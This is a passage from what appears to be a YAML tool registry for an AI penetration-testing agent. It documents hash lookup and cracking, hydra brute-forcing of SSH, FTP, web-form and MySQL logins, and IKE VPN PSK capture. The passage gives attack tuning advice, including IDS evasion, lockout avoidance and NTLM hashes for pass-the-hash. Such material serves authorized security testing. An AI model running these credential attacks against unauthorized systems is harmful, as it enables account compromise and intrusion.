    methods:
      lookup:
        description: 'Look up a single hash in public pre-cracked hash databases. Queries sources in order: (1) hashes.com
          API (best coverage, supports all hash types), (2) nitrxgen (MD5 only, fast), (3) hashtoolkit.com (HTML scraping).
          Returns immediately when the first source finds a match. These databases contain billions of pre-computed hash-to-plaintext
          mappings from rainbow tables and wordlist cracking. Only works for unsalted hashes (MD5, SHA1, SHA256, NTLM) — salted
          hashes ($6$, bcrypt, etc.) won''t be found in online databases.'
        when_to_use: 'The very first thing to try when you have unsalted password hashes — before running john or hashcat.
          Online lookup takes 1-3 seconds vs minutes/hours for offline cracking. Common scenario: extract MD5/SHA1/NTLM hashes
          from a database dump or web application, look them up here first, then crack the remaining unfound hashes with john.
          Works best for: simple MD5 hashes, NTLM hashes from Windows, SHA1 hashes from older applications. Won''t work for:
          salted hashes (Linux /etc/shadow $6$..., bcrypt $2a$...), non-standard hash formats, or strong unique passwords.'
        params:
          hash:
            type: string
            required: true
            description: 'Hash value to look up. Bare hex string only — no prefix, no ''user:'' prefix, no salt. Examples:
              ''5f4dcc3b5aa765d61d8327deb882cf99'' (MD5 of ''password''), ''a94a8fe5ccb19ba61c4c0873d391e987982fbbd3'' (SHA1).
              The hash is lowercased and trimmed automatically.'
          hash_type:
            type: enum
            values:
            - auto
            - md5
            - sha1
            - sha256
            - ntlm
            default: auto
            description: 'Hash type. ''auto'' detects by length: 32 chars = MD5 or NTLM, 40 chars = SHA1, 64 chars = SHA256.
              Specifying the type doesn''t change the lookup behavior much — it mainly helps with logging. Note: 32-char hashes
              are ambiguous between MD5 and NTLM (both are 32 hex chars).'
        returns:
          hash:
            type: string
            description: The hash that was looked up (lowercased)
          plaintext:
            type: string
            description: Recovered plaintext password (null if not found)
          source:
            type: string
            description: Database that returned the result ('hashes.com', 'nitrxgen', or 'hashtoolkit')
          cracked:
            type: boolean
            description: Whether the plaintext was found in any database
          hash_type:
            type: string
            description: Detected or specified hash type
      lookup_batch:
        description: 'Look up multiple hashes sequentially by calling the lookup method for each hash. Results are aggregated
          into cracked and not_found lists. Note: this is sequential (not parallel), so N hashes take N * 1-3 seconds. The
          not_found output is capped at 10 entries to avoid excessive output.'
        when_to_use: 'When you have multiple hashes from a database dump and want to check all of them at once. Typical scenario:
          dump a users table with sqlmap, extract the password hash column, and batch-look up all hashes. More convenient
          than calling lookup repeatedly. For large batches (100+), this will take several minutes due to sequential API calls
          with rate limiting.'
        params:
          hashes:
            type: array
            required: true
            description: 'List of hash strings to look up. Each hash should be a bare hex string. Example: [''5f4dcc3b5aa765d61d8327deb882cf99'',
              ''e99a18c428cb38d5f260853678922e03'']. All hashes should be the same type.'
          hash_type:
            type: enum
            values:
            - auto
            - md5
            - sha1
            - sha256
            - ntlm
            default: auto
            description: Hash type for all hashes in the batch. Use 'auto' if you're unsure — detection is by length.
        returns:
          results:
            type: array
            description: 'Full result for each hash (same fields as lookup: hash, plaintext, source, cracked)'
          total:
            type: integer
            description: Total number of hashes submitted
          cracked_count:
            type: integer
            description: Number of hashes successfully recovered
          not_found_count:
            type: integer
            description: Number of hashes not found in any database
      identify:
        description: 'Identify the type of a hash using pattern matching on hash length and format. Detection patterns: 32
          hex chars = MD5 or NTLM (ambiguous), 40 hex chars = SHA1, 64 hex chars = SHA256, 128 hex chars = SHA512, *[40 hex]
          = MySQL 4.1+, $2a$/$2b$ prefix = bcrypt. Returns possible types with human-readable descriptions.'
        when_to_use: 'When you find a hash and need to determine its type before cracking with john or looking it up. Common
          in pentesting: find a hash in a config file, database column, or web application source code and need to identify
          it. Note: 32-character hex hashes are ambiguous between MD5 and NTLM — use context to distinguish (Windows = NTLM,
          web app = usually MD5). For more definitive identification with john-specific format names, use john''s identify
          method instead. This method is faster (no Docker container needed) and provides more user-friendly descriptions.'
        params:
          hash:
            type: string
            required: true
            description: Single hash to identify. Bare hex string, no prefix needed. For bcrypt, include the full '$2a$10$...'
              string. For MySQL, include the leading '*'.
        returns:
          possible_types:
            type: array
            description: List of possible hash type names (e.g., ['md5', 'ntlm'] for 32-char hex)
          descriptions:
            type: array
            description: Human-readable descriptions of each type (e.g., 'MD5 - 128-bit hash, commonly used for passwords')
          length:
            type: integer
            description: Length of the hash string
      generate:
        description: Generate a hash from plaintext using Python's hashlib. Supports MD5, SHA1, SHA256, SHA512, and NTLM (MD4
          of UTF-16LE encoded input). Useful for testing and verification — generate a hash from a suspected plaintext and
          compare it to the target hash to confirm a match.
        when_to_use: 'Two main use cases: (1) Verify a cracked password — if you cracked ''password123'' from a hash, generate
          the hash of ''password123'' and compare to confirm. (2) Testing — generate known hashes for testing the lookup functionality.
          For NTLM hash generation: useful when you have a plaintext password and need the NTLM hash for pass-the-hash attacks
          with impacket.'
        params:
          plaintext:
            type: string
            required: true
            description: Text to hash. The exact string will be hashed — no trimming or normalization. For NTLM, the string
              is UTF-16LE encoded before MD4 hashing (matching Windows behavior).
          hash_type:
            type: enum
            values:
            - md5
            - sha1
            - sha256
            - sha512
            - ntlm
            default: md5
            description: Hash algorithm. md5=MD5 (32 hex), sha1=SHA-1 (40 hex), sha256=SHA-256 (64 hex), sha512=SHA-512 (128
              hex), ntlm=NTLM/MD4-UTF16LE (32 hex, Windows password hash format).
        returns:
          plaintext:
            type: string
            description: The original plaintext that was hashed
          hash:
            type: string
            description: Generated hash as lowercase hex string
          hash_type:
            type: string
            description: Hash algorithm used
  hydra:
    name: hydra
    version: '9.6'
    description: Network authentication brute-forcing tool (v9.6) supporting 50+ protocols including SSH, FTP, HTTP forms,
      RDP, SMB, MySQL, PostgreSQL, VNC, IMAP, SMTP, Redis, MongoDB, LDAP, and more. Features service-specific thread defaults
      (SSH=4, HTTP=16) to avoid rate limiting. Ships with SecLists and rockyou.txt wordlists pre-installed. Supports password
      list attacks (-P), single password testing (-p), null/same/reversed login checks (-e nsr), and brute-force character
      generation (-x). HTTP form attacks use the format '/path:user=^USER^&pass=^PASS^:F=error_string'. Always runs with -V
      (verbose) for progress tracking.
    image: ghcr.io/silicon-works/mcp-tools-hydra:latest
    image_size_mb: 200
    capabilities:
    - password_bruteforce
    - credential_testing
    routing:
      use_for:
      - password brute-forcing against network services
      - credential testing and default password checking
      - SSH FTP RDP VNC login brute-force
      - HTTP web login form brute-force
      - MySQL PostgreSQL database credential brute-force
      - test known credentials against multiple services
      - try default passwords on discovered services
      - SMTP IMAP POP3 email credential brute-force
      - SMB Windows share authentication testing
      - network login attack with wordlists like rockyou
      - Redis MongoDB MSSQL LDAP SNMP credential brute-force
      - Cisco device login brute-force
      - combo file default credential testing login:pass
      - PIN brute-force password generation
      never_use_for:
      - hash cracking (use john or hashcat)
      - offline password cracking (use john)
      - vulnerability scanning (use nmap or nuclei)
      - SQL injection (use sqlmap)
      triggers:
      - brute force
      - password attack
      - credential brute
      - hydra
      - login brute
      - default credentials
      - rockyou
      - wordlist attack
      prefer_over: []
    phases:
    - exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 256
      cpu: 1.0
    methods:
      bruteforce:
        description: 'Brute-force login credentials for any supported network service using hydra. Supports 50+ protocols
          including SSH, FTP, HTTP (basic/form), RDP, SMB, MySQL, PostgreSQL, VNC, IMAP, SMTP, Redis, MongoDB, LDAP, SNMP,
          and more. Always runs with -V (verbose) for progress tracking. Uses service-specific default thread counts (SSH=4,
          FTP=8, HTTP=16, MySQL=4, RDP=4) to avoid rate limiting and account lockout. If no username or password list is provided,
          defaults to SecLists top-usernames-shortlist.txt and 10k-most-common.txt. Parses hydra output for credentials in
          the format ''[port][service] host: X login: Y password: Z''. Supports graceful timeout with partial result recovery.'
        when_to_use: 'When you need to test credentials against a network service — either brute-forcing with wordlists or
          testing known/default credentials. Common scenarios: (1) Testing default credentials on discovered services (use
          single username + password), (2) Brute-forcing SSH/FTP/RDP with a wordlist after finding an open port, (3) Attacking
          web login forms after identifying the form fields and failure string, (4) Credential stuffing with found usernames/passwords
          against other services. Always try default/common credentials first (fast) before large wordlists (slow). For SSH,
          keep threads at 4 (default) to avoid MaxStartups rate limiting. For web forms, use web_form_brute convenience method
          instead. For HTTP basic auth, use http-get service. Hydra is for ONLINE brute-forcing — for offline hash cracking,
          use john.'
        params:
          target:
            type: string
            required: true
            description: Target IP, hostname, or CIDR range (e.g., '10.10.10.1', 'target.htb', '192.168.1.0/24'). CIDR ranges
              attack each host in the range.
          service:
            type: enum
            required: true
            values:
            - ssh
            - ftp
            - http-get
            - http-post
            - http-post-form
            - http-get-form
            - https-get
            - https-post
            - https-post-form
            - https-get-form
            - smb
            - smb2
            - rdp
            - mysql
            - mssql
            - postgres
            - vnc
            - telnet
            - smtp
            - pop3
            - imap
            - redis
            - mongodb
            - ldap2
            - ldap3
            - snmp
            - sshkey
            - http-proxy
            - rtsp
            - sip
            - cisco
            - cisco-enable
            - svn
            - firebird
            - oracle-listener
            - rsh
            - rlogin
            - rexec
            description: 'Service protocol to attack. Exposes 37 of hydra''s 50+ protocols. For HTTP basic auth: use ''http-get''.
              For web login forms: use ''http-post-form'' (most common) or ''http-get-form''. For HTTPS: prefix with ''https-''.
              For SMB/Windows shares: use ''smb'' or ''smb2''. For LDAP: use ''ldap2'' (LDAPv2) or ''ldap3'' (LDAPv3). For
              SSH key auth testing: use ''sshkey''. For Cisco devices: use ''cisco'' (telnet login) or ''cisco-enable'' (enable
              password).'
          username:
            type: string
            description: 'Single username to test (hydra -l). Use for targeted testing of a known username. Examples: ''admin'',
              ''root'', ''user''. Mutually exclusive with userlist — if both are provided, username takes precedence.'
          userlist:
            type: string
            description: 'Username wordlist. Built-in names: ''usernames'' (/usr/share/seclists/Usernames/top-usernames-shortlist.txt,
              ~17 names), ''ssh-usernames'' (30 common SSH usernames: root, admin, ubuntu, etc.). Or provide an absolute path
              to a custom list. If neither username nor userlist is provided, defaults to ''usernames''.'
          password:
            type: string
            description: Single password to test (hydra -p). Use for testing a known/default password. If set, passlist is
              ignored.
          passlist:
            type: string
            description: 'Password wordlist. Built-in names: ''rockyou'' (/usr/share/wordlists/rockyou.txt, ~14M passwords
              — very slow), ''common-passwords'' (/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt, 10K
              passwords — good default), ''default-passwords'' (/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt).
              Or provide an absolute path. If neither password nor passlist is provided, defaults to ''common-passwords''.
              Ignored if password is set.'
          threads:
            type: integer
            description: 'Number of parallel connections (hydra -t). Defaults are service-specific: SSH=4 (avoid MaxStartups),
              FTP=8, MySQL=4, PostgreSQL=4, RDP=4, VNC=4, SMB=8, HTTP=16. Higher threads = faster but risks rate limiting,
              account lockout, or connection errors. For SSH, never exceed 4-6.'
          port:
            type: integer
            description: 'Service port (hydra -s). Defaults: SSH=22, FTP=21, HTTP=80, HTTPS=443, SMB=445, RDP=3389, MySQL=3306,
              PostgreSQL=5432, VNC=5900, Telnet=23, SMTP=25, POP3=110, IMAP=143. Override when services run on non-standard
              ports.'
          timeout:
            type: integer
            default: 600
            description: Process timeout in seconds. 600s (10 min) is sufficient for small wordlists (100-1000 entries). For
              rockyou (14M entries), you'd need hours — use common-passwords instead or narrow the username list. If timeout
              is reached, partial results (any credentials found so far) are returned.
          wait_time:
            type: integer
            description: Seconds to wait between connection attempts per thread (hydra -W flag). Default is 0 (no wait). Use
              1-3 seconds to avoid rate limiting on sensitive services like SSH or to evade IDS/IPS detection. Slows attack
              significantly.
          stop_on_first:
            type: boolean
            default: false
            description: Stop after finding the first valid credential (hydra -f flag). Recommended for most scenarios — once
              you have one valid login, you can use it. Set to false only when you need to enumerate ALL valid credentials.
          try_common:
            type: string
            enum:
            - n
            - s
            - r
            - ns
            - nr
            - sr
            - nsr
            description: Try common password variations before wordlist (hydra -e). n=null/empty password, s=same as login
              (username as password), r=reversed login. Use 'nsr' to try all three. These are tested first and are very fast.
              Always use 'nsr' when testing for misconfigurations.
          verbose:
            type: boolean
            default: false
            description: 'Include detailed verbose output with each login attempt in the response (warning: can be very large
              with big wordlists). The last 1000 attempt lines are captured. Useful for debugging when credentials aren''t
              being found but expected.'
          http_path:
            type: string
            description: 'URL path for HTTP basic auth services (http-get, http-post). Examples: ''/'', ''/admin'', ''/manager/html''.
              Not used for form-based attacks.'
          http_form:
            type: string
            description: 'HTTP form attack specification for http-post-form/http-get-form services. Format: ''/login_path:POST_body_with_^USER^_and_^PASS^:F=failure_string''.
              Example: ''/login.php:username=^USER^&password=^PASS^:F=Invalid credentials''. The F= prefix means ''fail if
              this string appears in the response''. Use H= for custom headers: ''/login:user=^USER^&pass=^PASS^:F=failed:H=Cookie:
              session=abc''. For the convenience method web_form_brute, this is auto-constructed.'
          loop_users:
            type: boolean
            default: false
            description: Loop around users instead of passwords (hydra -u). Default behavior tries all passwords for user1,
              then user2, etc. With -u, tries password1 for ALL users, then password2 for ALL users. Critical for avoiding
              account lockout — if lockout threshold is 5 failed attempts, this ensures each user gets only 1 attempt per
              password cycle.
          password_gen:
            type: string
            description: 'Generate passwords instead of using a wordlist (hydra -x). Format: ''MIN:MAX:CHARSET''. CHARSET
              characters: ''a''=lowercase, ''A''=uppercase, ''1''=numbers. Examples: ''4:4:1'' (all 4-digit PINs, 10000 combos),
              ''1:3:a1'' (1-3 char lowercase+digits), ''3:5:aA1'' (3-5 chars mixed case+digits). Overrides passlist. Warning:
              large charsets with high MAX generate enormous keyspaces.'
          combo_file:
            type: string
            description: 'Colon-separated login:pass file (hydra -C). Each line has format ''username:password''. Overrides
              all other username/password options (-l/-L/-p/-P). Useful with default credential lists. Available lists: ''/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt'',
              ''/usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt'', etc.'
          ssl:
            type: boolean
            default: false
            description: Use SSL for the connection (hydra -S). Required for IMAPS (port 993), POP3S (port 995), SMTPS (port
              465), LDAPS (port 636). Not needed for HTTPS services (use the 'https-*' service variants instead). Can also
              be used for any service running over SSL on a non-standard port.
        returns:
          credentials:
            type: array
            description: 'Valid username:password combinations found. Each entry: {port, service, host, username, password}'
          found:
            type: boolean
            description: Whether any valid credentials were found
          count:
            type: integer
            description: Number of valid credentials found
          stats:
            type: object
            description: 'Attack statistics: attempts_total (total login combinations), attempts_completed (attempts finished),
              attempts_successful (credentials found)'
          warnings:
            type: array
            description: Hydra warnings (e.g., 'Restorefile found, press enter to continue' is suppressed by -I)
          partial:
            type: boolean
            description: True if operation timed out before completing — partial results may still contain found credentials
          verbose_output:
            type: string
            description: Detailed attempt log (if verbose=true), last 1000 lines of [ATTEMPT] and [STATUS] lines
          summary:
            type: object
            description: 'Operation summary: target, service, port, threads used, found (bool), duration_seconds'
      ssh_brute:
        description: 'Brute-force SSH login — convenience wrapper around bruteforce with SSH-optimized defaults (threads=4,
          port=22, service=ssh). Delegates to the bruteforce method internally. SSH servers typically enforce MaxStartups
          rate limiting (default: 10 unauthenticated connections), so threads=4 is the safe default. Higher thread counts
          may cause ''Connection refused'' errors.'
        when_to_use: 'When nmap discovers port 22 (SSH) open and you want to test for weak credentials. Common scenarios:
          (1) Try default usernames with common-passwords: set userlist=''ssh-usernames'' (tests 30 common users like root,
          admin, ubuntu, etc.), (2) Test a specific username found elsewhere: set username=''admin'' with passlist=''common-passwords'',
          (3) Quick default credential check: set username=''root'', try_common=''nsr'' (tests null, root, toor). Always start
          with a small wordlist and try_common=''nsr'' before moving to larger lists. SSH brute-forcing is slow due to rate
          limiting — 10K passwords against 1 user takes ~40 minutes at 4 threads.'
        params:
          target:
            type: string
            required: true
            description: Target IP or hostname (e.g., '10.10.10.1', 'target.htb').
          username:
            type: string
            description: 'Single username to test. Common SSH users: ''root'', ''admin'', ''user'', ''ubuntu'', ''www-data''.
              Use when you know the target username.'
          userlist:
            type: string
            description: 'Username wordlist. Built-in: ''ssh-usernames'' (30 common SSH usernames: root, admin, user, ubuntu,
              debian, kali, centos, ec2-user, pi, vagrant, etc.), ''usernames'' (SecLists top-usernames-shortlist, ~17 names).
              Or provide an absolute path.'
          password:
            type: string
            description: Single password to test. Use for testing a known/default password against username(s). If set, passlist
              is ignored.
          passlist:
            type: string
            description: 'Password wordlist. Built-in: ''common-passwords'' (10K most common, good default), ''rockyou'' (14M
              passwords, very slow for SSH). Also available: ''/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt''
              (20 most common SSH passwords — fastest).'
          port:
            type: integer
            default: 22
            description: SSH port. Default 22. Override for non-standard SSH ports found by nmap.
          threads:
            type: integer
            default: 4
            description: Parallel connections. Default 4 for SSH. Do NOT increase above 6 — SSH MaxStartups (default 10:30:60)
              will drop connections, causing false negatives.
          timeout:
            type: integer
            default: 600
            description: Process timeout in seconds. Default 600s (10 min). With 4 threads and 10K passwords, a single-user
              attack takes ~40 minutes — increase timeout accordingly or use a smaller wordlist.
          wait_time:
            type: integer
            description: Seconds to wait between connection attempts per thread (hydra -W). Use 1-2 if seeing connection refused
              errors.
          stop_on_first:
            type: boolean
            default: false
            description: Stop after finding the first valid credential. Recommended for most cases.
          try_common:
            type: string
            enum:
            - n
            - s
            - r
            - ns
            - nr
            - sr
            - nsr
            description: 'Try common password variations first: n=null/empty, s=same as login (e.g., root:root), r=reversed
              login (e.g., root:toor). Use ''nsr'' as a fast first step before wordlists.'
          verbose:
            type: boolean
            default: false
            description: 'Include verbose attempt log in output. Warning: large with big wordlists.'
          loop_users:
            type: boolean
            default: false
            description: Loop around users instead of passwords (-u). Critical for avoiding account lockout.
          password_gen:
            type: string
            description: 'Generate passwords instead of using a wordlist (-x). Format: ''MIN:MAX:CHARSET''. Overrides passlist.'
          combo_file:
            type: string
            description: Colon-separated login:pass file (-C). Overrides username/password options. Try '/usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt'.
        returns:
          credentials:
            type: array
            description: 'Valid username:password combinations found. Each entry: {port, service, host, username, password}'
          stats:
            type: object
            description: 'Attack statistics: attempts_total, attempts_completed, attempts_successful'
      ftp_brute:
        description: Brute-force FTP login — convenience wrapper around bruteforce with FTP defaults (threads=8, port=21,
          service=ftp). FTP servers are generally more tolerant of concurrent connections than SSH, so 8 threads is safe.
          If no username or userlist is provided, defaults to SecLists top-usernames-shortlist. Check for anonymous FTP access
          first (username='anonymous', password='anonymous@') before brute-forcing — nmap's ftp-anon script or manual check
          is faster.
        when_to_use: When nmap discovers port 21 (FTP) open. First check anonymous access (username='anonymous', password='anonymous@'
          or empty). If anonymous fails, brute-force with common credentials. FTP is commonly found on older systems, file
          servers, and backup systems. Also useful for vsftpd, ProFTPD, or FileZilla Server credential testing. FTP transmits
          credentials in cleartext, so any found credentials may also work for SSH or other services on the same target.
        params:
          target:
            type: string
            required: true
            description: Target IP or hostname.
          username:
            type: string
            description: Single username to test. Try 'anonymous' first for anonymous FTP access, then 'admin', 'root', 'ftp',
              'ftpuser'.
          userlist:
            type: string
            description: 'Username wordlist. Built-in: ''usernames'' (SecLists top-usernames-shortlist, ~17 names). If neither
              username nor userlist is provided, defaults to ''usernames''.'
          password:
            type: string
            description: Single password to test. For anonymous FTP, use 'anonymous@' or empty string. If set, passlist is
              ignored.
          passlist:
            type: string
            description: 'Password wordlist. Built-in: ''common-passwords'' (10K most common), ''default-passwords'' (default
              credentials), ''rockyou'' (14M — slow). Also: ''/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt''
              for FTP-specific defaults.'
          port:
            type: integer
            default: 21
            description: FTP port. Default 21. Override for non-standard FTP ports.
          threads:
            type: integer
            default: 8
            description: Parallel connections. Default 8 for FTP. Can increase to 16 for faster testing on robust servers.
          timeout:
            type: integer
            default: 600
            description: Process timeout in seconds. Default 600s (10 min).
          wait_time:
            type: integer
            description: Seconds to wait between connection attempts per thread.
          stop_on_first:
            type: boolean
            default: false
            description: Stop after finding the first valid credential.
          try_common:
            type: string
            enum:
            - n
            - s
            - r
            - ns
            - nr
            - sr
            - nsr
            description: 'Try common password variations first: n=null/empty, s=same as login, r=reversed. Use ''nsr'' as
              a quick first check.'
          verbose:
            type: boolean
            default: false
            description: Include verbose attempt log in output.
          loop_users:
            type: boolean
            default: false
            description: Loop around users instead of passwords (-u). Critical for avoiding account lockout.
          password_gen:
            type: string
            description: 'Generate passwords instead of using a wordlist (-x). Format: ''MIN:MAX:CHARSET''. Overrides passlist.'
          combo_file:
            type: string
            description: Colon-separated login:pass file (-C). Overrides username/password options. Try '/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt'.
        returns:
          credentials:
            type: array
            description: 'Valid username:password combinations found. Each entry: {port, service, host, username, password}'
          stats:
            type: object
            description: 'Attack statistics: attempts_total, attempts_completed, attempts_successful'
      web_form_brute:
        description: Brute-force a web login form — convenience wrapper that auto-constructs the hydra http-post-form attack
          string from individual parameters (path, user_field, pass_field, fail_string). Internally builds the format '/path:user_field=^USER^&pass_field=^PASS^[&extra_params]:F=fail_string'
          and delegates to bruteforce with service=http-post-form (or https-post-form if https=true). Default 16 threads —
          web servers handle concurrent connections well.
        when_to_use: 'When you''ve identified a web login form and want to brute-force it. Before using this, you need to
          know: (1) the login form path (''/login.php'', ''/wp-login.php'', ''/admin/login''), (2) the username and password
          field names (inspect the HTML form — look for <input name=''...''> attributes), (3) a string that appears ONLY on
          failed login attempts (e.g., ''Invalid credentials'', ''Login failed'', ''incorrect password''). Get these by: manually
          submitting a login with invalid credentials and inspecting the response. Common CMS paths: WordPress=''/wp-login.php''
          (user=''log'', pass=''pwd'', fail=''Invalid''), Drupal=''/user/login'', Joomla=''/administrator''. For WordPress,
          prefer wpscan''s built-in brute-force instead. Does NOT handle CSRF tokens, JavaScript-based logins, or CAPTCHAs.'
        params:
          target:
            type: string
            required: true
            description: Target IP or hostname (e.g., '10.10.10.1', 'target.htb'). Do NOT include http:// prefix — just the
              host.
          path:
            type: string
            required: true
            description: 'Login form URL path including leading slash. Examples: ''/login.php'', ''/admin/login'', ''/wp-login.php'',
              ''/user/login'', ''/index.php?page=login''. Must be the form ACTION URL (where the POST request is sent), not
              necessarily the page URL.'
          user_field:
            type: string
            default: username
            description: 'HTML form field name for the username input. Common values: ''username'', ''user'', ''login'', ''email'',
              ''log'' (WordPress), ''name'' (Drupal). Find by inspecting the login form HTML: <input name=''THIS_VALUE''>.'
          pass_field:
            type: string
            default: password
            description: 'HTML form field name for the password input. Common values: ''password'', ''pass'', ''passwd'',
              ''pwd'' (WordPress). Find by inspecting the login form HTML.'
          fail_string:
            type: string
            required: true
            description: 'String that appears in the HTTP response ONLY when login FAILS. Hydra uses this to distinguish success
              from failure (F=). Examples: ''Invalid credentials'', ''Login failed'', ''incorrect'', ''Wrong password'', ''Invalid
              username''. Must be unique to the failure response — if it also appears on successful login, hydra won''t detect
              valid credentials. Test by manually submitting invalid credentials and checking the response body.'
          username:
            type: string
            description: Single username to test. Use when you know the target user (e.g., 'admin'). Mutually exclusive with
              userlist.
          userlist:
            type: string
            description: 'Username wordlist. Built-in: ''usernames'' (SecLists top-usernames-shortlist). Defaults to ''usernames''
              if neither username nor userlist is provided.'
          password:
            type: string
            description: Single password to test. If set, passlist is ignored.
          passlist:
            type: string
            description: 'Password wordlist. Built-in: ''common-passwords'' (10K), ''rockyou'' (14M). Defaults to ''common-passwords''
              if neither password nor passlist is provided.'
          https:
            type: boolean
            default: false
            description: Use HTTPS (switches service to https-post-form and default port to 443). Set to true if the target
              login page is served over HTTPS.
          port:
            type: integer
            description: Port number. Defaults to 80 (HTTP) or 443 (HTTPS). Override for non-standard ports (e.g., 8080, 8443).
          threads:
            type: integer
            default: 16
            description: Parallel connections. Default 16 for HTTP. Web servers handle concurrency well. Reduce to 4-8 if
              seeing connection errors or if the server has rate limiting.
          extra_params:
            type: string
            description: 'Additional POST parameters to include in every request (appended to the form body). Format: ''param1=value1&param2=value2''.
              Common uses: ''submit=Login'' (submit button value), ''csrf_token=STATIC_VALUE'' (only works if CSRF token is
              static — dynamic CSRF tokens will cause every attempt to fail).'
          timeout:
            type: integer
            default: 600
            description: Process timeout in seconds. Default 600s (10 min). Web form attacks are fast (16 threads), so 10K
              passwords completes in ~5 minutes.
          wait_time:
            type: integer
            description: Seconds to wait between connection attempts per thread. Use if the server has rate limiting.
          stop_on_first:
            type: boolean
            default: false
            description: Stop after finding the first valid credential. Recommended for most cases.
          try_common:
            type: string
            enum:
            - n
            - s
            - r
            - ns
            - nr
            - sr
            - nsr
            description: 'Try common password variations first: n=null/empty, s=same as login, r=reversed. Use ''nsr'' as
              a quick first check.'
          verbose:
            type: boolean
            default: false
            description: Include verbose attempt log in output.
          loop_users:
            type: boolean
            default: false
            description: Loop around users instead of passwords (-u). Critical for avoiding account lockout.
          password_gen:
            type: string
            description: 'Generate passwords instead of using a wordlist (-x). Format: ''MIN:MAX:CHARSET''. Overrides passlist.'
          combo_file:
            type: string
            description: Colon-separated login:pass file (-C). Overrides username/password options.
          ssl:
            type: boolean
            default: false
            description: Use SSL for the connection (-S). Use when the web form is served over SSL on a non-standard setup.
        returns:
          credentials:
            type: array
            description: 'Valid username:password combinations found. Each entry: {port, service, host, username, password}'
          stats:
            type: object
            description: 'Attack statistics: attempts_total, attempts_completed, attempts_successful'
      mysql_brute:
        description: 'Brute-force MySQL login — convenience wrapper around bruteforce with MySQL defaults (threads=4, port=3306,
          service=mysql, username=''root''). Database connections are expensive, so 4 threads is the safe default. Note: MySQL
          may block hosts after too many failed attempts (max_connect_errors, default 100) — the host must be flushed with
          FLUSH HOSTS or wait.'
        when_to_use: 'When nmap discovers port 3306 (MySQL) or 3307 open. MySQL root with empty password is a common misconfiguration
          — test with username=''root'', try_common=''n'' first (null password). Then try default passwords with ''common-passwords''
          wordlist. Also try found credentials from other services (password reuse). If MySQL is only listening on localhost
          (127.0.0.1), you need SSH access or a tunnel first. For MariaDB, use the same mysql service — hydra''s MySQL module
          works for both. Available default credential list: ''/usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt''.'
        params:
          target:
            type: string
            required: true
            description: Target IP or hostname. MySQL must be listening on a network-accessible interface (not just localhost).
          username:
            type: string
            default: root
            description: 'Single username to test. Defaults to ''root'' (MySQL superuser). Other common MySQL users: ''admin'',
              ''mysql'', ''dbadmin'', ''webapp'', ''drupal'', ''wordpress''. If userlist is provided, this is ignored.'
          userlist:
            type: string
            description: Username wordlist. If provided, overrides the default username='root'. Use 'usernames' for common
              names.
          password:
            type: string
            description: Single password to test. If set, passlist is ignored.
          passlist:
            type: string
            description: 'Password wordlist. Built-in: ''common-passwords'' (10K), ''default-passwords'', ''rockyou'' (14M).
              Also: ''/usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt'' for MySQL-specific
              defaults.'
          port:
            type: integer
            default: 3306
            description: MySQL port. Default 3306. MariaDB also typically uses 3306.
          threads:
            type: integer
            default: 4
            description: Parallel connections. Default 4 for MySQL. Database connections are expensive — higher threads may
              cause 'Too many connections' errors.
          timeout:
            type: integer
            default: 600
            description: Process timeout in seconds. Default 600s (10 min).
          wait_time:
            type: integer
            description: Seconds to wait between connection attempts per thread.
          stop_on_first:
            type: boolean
            default: false
            description: Stop after finding the first valid credential.
          try_common:
            type: string
            enum:
            - n
            - s
            - r
            - ns
            - nr
            - sr
            - nsr
            description: 'Try common password variations first: n=null/empty (most important for MySQL — root with no password
              is common), s=same as login, r=reversed. Use ''nsr'' or at minimum ''n''.'
          verbose:
            type: boolean
            default: false
            description: Include verbose attempt log in output.
          loop_users:
            type: boolean
            default: false
            description: Loop around users instead of passwords (-u). Critical for avoiding account lockout.
          password_gen:
            type: string
            description: 'Generate passwords instead of using a wordlist (-x). Format: ''MIN:MAX:CHARSET''. Overrides passlist.'
          combo_file:
            type: string
            description: Colon-separated login:pass file (-C). Overrides username/password options. Try '/usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt'.
        returns:
          credentials:
            type: array
            description: 'Valid username:password combinations found. Each entry: {port, service, host, username, password}'
          stats:
            type: object
            description: 'Attack statistics: attempts_total, attempts_completed, attempts_successful'
  ike-scan:
    name: ike-scan
    version: 1.1.0
    description: 'IKE/IPsec VPN enumeration and exploitation tool (wraps ike-scan and psk-crack). 6 methods: scan (detect
      IKE service on UDP 500), aggressive_mode (test group name + capture PSK hash), enumerate_transforms (discover encryption/auth
      methods), brute_group_names (parallel group name brute force with built-in wordlists), get_psk_hash (capture PSK hash
      for offline cracking), crack_psk (dictionary or brute force PSK cracking via psk-crack — john does NOT support IKE PSK
      format). Full IKEv1 main mode and aggressive mode support.'
    image: ghcr.io/silicon-works/mcp-tools-ike-scan:latest
    image_size_mb: 150
    capabilities:
    - ike_enumeration
    - vpn_testing
    - aggressive_mode
    - psk_capture
    - psk_cracking
    - transform_enumeration
    - group_name_bruteforce
    routing:
      use_for:
      - detect IKE VPN service on UDP port 500 and identify vendor
      - test IKE aggressive mode with group name to capture PSK hash
      - brute force IKE VPN group names with built-in or custom wordlists
      - capture IKE PSK hash for offline cracking from aggressive mode handshake
      - crack captured IKE PSK hash with psk-crack dictionary or brute force
      - enumerate IKE transforms to discover supported encryption and auth methods
      - IPsec VPN penetration testing workflow from detection to credential recovery
      never_use_for:
      - SSL VPN testing
      - OpenVPN testing
      triggers:
      - ike
      - ipsec
      - vpn port 500
      - psk crack
      prefer_over: []
    phases:
    - reconnaissance
    - enumeration
    - exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 128
      cpu: 0.25
    methods:
      scan:
        description: Basic IKE scan to detect VPN endpoints
        when_to_use: To check if port 500 has an IKE service
        params:
          target:
            type: string
            required: true
            description: Target IP address or hostname
          sport:
            type: integer
            default: 500
            description: Source port
          dport:
            type: integer
            default: 500
            description: Destination port
        returns:
